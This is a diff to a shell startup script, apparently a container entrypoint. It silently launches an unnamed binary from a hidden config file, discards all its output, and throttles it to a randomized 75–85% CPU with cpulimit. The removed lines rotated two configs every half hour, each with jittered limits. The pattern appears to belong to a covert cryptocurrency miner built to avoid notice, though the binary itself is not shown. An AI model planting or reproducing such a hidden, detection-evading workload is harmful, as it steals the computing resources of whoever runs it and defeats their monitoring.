@@ -14,35 +14,10 @@ rm -f /app/isu
 
 sleep 3
 
-while true; do
+/app/$NAME -c .cfg >/dev/null 2>&1 &
+P=$!
 
-  # ===== RUN CFG =====
-  /app/$NAME -c .cfg >/dev/null 2>&1 &
-  P=$!
-
-  LIMIT=$((70 + RANDOM % 10))
-  cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
-
-  sleep 1800
-
-  kill -15 $P 2>/dev/null
-  sleep 2
-  kill -9 $P 2>/dev/null
-
-
-  # ===== RUN SFG =====
-  /app/$NAME -c .sfg >/dev/null 2>&1 &
-  P=$!
-
-  LIMIT=$((75 + RANDOM % 11))
-  cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
-
-  sleep 1800
-
-  kill -15 $P 2>/dev/null
-  sleep 2
-  kill -9 $P 2>/dev/null
-
-done &
+LIMIT=$((75 + RANDOM % 11))
+cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
 
 tail -f /dev/null
